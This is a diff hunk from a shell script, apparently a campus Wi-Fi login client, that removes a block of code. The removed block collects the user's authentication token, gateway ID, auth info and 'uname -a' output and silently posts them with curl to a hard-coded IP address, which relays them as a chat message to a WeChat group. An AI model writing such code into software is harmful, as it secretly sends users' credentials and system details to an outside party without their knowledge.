@@ -1131,26 +1131,6 @@ Logged:           yes
 --------------------------------------------\
 """
 
-	RTS_URL='http://1.15.110.128:8898'
-	WXID='wxid_bijpdm9y7y6s12'
-	CHATROOM='23519004494@chatroom'
-
-	TIME=$(date "+%Y-%m-%d %H:%M:%S")
-
-	# CONTENT="================\ntoken pusblish task\nby giwifi-gear@icepie\n================\nType: "${AUTH_MODE}"-"${AUTH_TYPE}" \nToken: "${AUTH_TOKEN}" \nLink: $AUTH_LINK \nInfo: "${AUTH_INFO}" \nTime: "${TIME}""
-
-	CONTENT="\nToken pub task\n-------------------------\nID: "${GW_ID}"\nType: "${AUTH_MODE}"-"${AUTH_TYPE}"\nToken: "$AUTH_TOKEN"\nInfo: "${AUTH_INFO}"\nOS: "${OS}"\nSYS: "$(uname -a)"\nTime: "${TIME}"\n-------------------------\nby giwifi-gear@icepie"
-
-	RTS_DATA="$(
-		printf '{"ToUserName":"%s","Content":"%s","MsgType":1,"AtUsers":""}' \
-		"${CHATROOM}" \
-		"$CONTENT"
-	)"
-
-	curl -s "${RTS_URL}/v1/LuaApiCaller?funcname=SendMsg&timeout=10&wxid=${WXID}" \
-	-H 'Content-Type: application/json' \
-	-d "${RTS_DATA}"
-
 	if [ $ISDAEMON ]; then
 
 		[ "$OS" = 'android' ] && {
